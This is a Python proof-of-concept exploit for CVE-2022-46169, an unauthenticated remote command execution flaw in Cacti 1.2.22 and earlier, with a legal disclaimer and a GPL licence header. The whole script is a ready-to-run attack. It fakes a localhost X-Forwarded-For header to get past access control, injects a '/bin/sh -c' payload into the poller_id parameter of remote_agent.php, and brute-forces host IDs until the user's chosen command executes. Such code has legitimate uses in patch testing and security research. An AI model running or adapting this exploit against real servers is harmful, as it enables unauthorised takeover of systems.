# This PoC may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this PoC.  The author accepts no liability
# for damage caused by this PoC.  If these terms are not acceptable to you, then
# do not use this PoC.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# This PoC may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this PoC.


import requests
import argparse

parser = argparse.ArgumentParser(
    prog='Poc for CVE-2022-46169',
    description='Exploit Unauthenticated RCE on Cacti <= 1.2.22',
    epilog='Author: saspect')

parser.add_argument('target', help='URL of the Cacti application.')


group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-f', type=argparse.FileType(),
                   help='File containing the command', dest='file')
group.add_argument('-c', help='Command', dest='cmd')

parser.add_argument(
    '--n_host_ids', help='The range of host_ids to try (0 - n)', default=100, dest='n_ids', type=int)

parser.add_argument(
    '--n_local_data_ids', help='The range of local_data_ids to try (0 - n)', default=50, dest='n_localids', type=int)


args = parser.parse_args()

if args.file:
    cmd = args.file.read().strip()
elif args.cmd:
    cmd = args.cmd
else:
    parser.print_help()
    exit(1)


payload = f'; /bin/sh -c "{cmd}"'

local_data_ids = [x for x in range(0, args.n_localids)]
target_ip = args.target.split("/")[2]

print(f"[*] Trying for 1 - {args.n_ids} host ids")


for host_id in range(args.n_ids):
    url = f'{args.target}/remote_agent.php'
    params = {'action': 'polldata', 'host_id': host_id,
              'poller_id': payload, 'local_data_ids[]': local_data_ids}
    headers = {'X-Forwarded-For': '127.0.0.1'}

    r = requests.get(url, params=params, headers=headers)
    if('proc' in r.text):
        print(f"[+] Exploit Completed for host_id = {host_id}")
        break
